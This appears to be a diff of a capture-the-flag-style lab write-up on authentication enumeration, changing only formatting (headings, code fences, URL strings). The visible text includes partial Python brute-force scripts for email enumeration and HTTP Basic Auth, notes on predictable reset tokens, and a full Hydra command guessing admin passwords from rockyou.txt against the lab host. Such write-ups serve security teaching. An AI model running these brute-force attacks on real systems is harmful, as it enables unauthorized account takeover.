@@ -41,7 +41,7 @@ s = requests.Session()
 
 def check_email(email):
     # Direct IP connection to bypass DNS issues
-    url = '[http://10.80.136.172/labs/verbose_login/functions.php](http://10.80.136.172/labs/verbose_login/functions.php)'
+    url = "http://10.80.136.172/labs/verbose_login/functions.php"
     headers = {
         'Host': 'enum.thm',
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
@@ -80,7 +80,7 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-2. Exploiting Predictable Tokens
+## 2. Exploiting Predictable Tokens
 
 Password reset tokens should be long, random, and complex. However, some developers use weak random number generators (e.g., mt_rand(100, 200)), making the token predictable and easy to brute force.
 The Vulnerability
@@ -133,7 +133,7 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-3. HTTP Basic Authentication
+## 3. HTTP Basic Authentication
 
 Basic Auth transmits credentials as a Base64 encoded string (Authorization: Basic user:pass). While simple, it's vulnerable to brute force attacks if weak passwords are used.
 ![](/assets/img/3-basic-auth.png)
@@ -141,9 +141,10 @@ Fig 3: The browser prompt requesting Basic Authentication credentials.
 Tool 1: Hydra (The Standard)
 
 Hydra is the go-to tool for this. Important Note: Always check the path! A wrong path (e.g., /lab/ instead of /labs/) can lead to false positives.
-Bash
+```Bash
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.136.172 http-get /labs/basic_auth/ -f -vV
+```
 ![](/assets/img/4-hydra-crack.png)
 Fig 4: Hydra successfully cracking the password.
 Tool 2: Universal Python Script
@@ -157,7 +158,7 @@ import sys
 from concurrent.futures import ThreadPoolExecutor
 import os
 
-TARGET_URL = "[http://10.80.136.172/labs/basic_auth/](http://10.80.136.172/labs/basic_auth/)"
+TARGET_URL = "http://10.80.136.172/labs/basic_auth/"
 USERNAME = "admin"
 
 def try_login(password):
@@ -176,7 +177,7 @@ def try_login(password):
         pass
 # ... (Threading logic is same as previous scripts)
 ```
-4. Passive Reconnaissance
+## 4. Passive Reconnaissance
 
 Before touching the server, we can find hidden gems using:
 ```
@@ -190,7 +191,7 @@ Before touching the server, we can find hidden gems using:
 ```
 ![](/assets/img/5-google-dorks.png)
 Fig 5: Using passive reconnaissance tools to find hidden endpoints.
-Conclusion
+## Conclusion
 
 Enumeration is not just about running tools; it's about understanding the application's logic. By combining manual verification with custom scripting (Python/Bash), we can overcome the limitations of standard tools and conduct more efficient security assessments.
 Here is a visual mind-map summarizing the tools and techniques we used in this lab:
